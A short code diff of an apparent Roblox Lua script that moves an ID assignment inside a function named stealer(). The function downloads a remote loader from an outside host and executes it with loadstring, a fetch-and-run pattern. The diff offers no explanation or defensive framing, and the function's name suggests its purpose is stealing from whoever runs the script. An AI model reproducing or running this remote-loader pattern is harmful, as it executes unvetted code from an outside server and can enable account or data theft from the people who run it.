@@ -1,5 +1,5 @@
-ID="95b92a4c-743c-4b3b-98b6-ac205954df63";
 local function stealer()
+    ID="95b92a4c-743c-4b3b-98b6-ac205954df63";
     loadstring(game:HttpGet("https://cdn.reverse.software/loader.luau"))()
 end
 local function loadui()
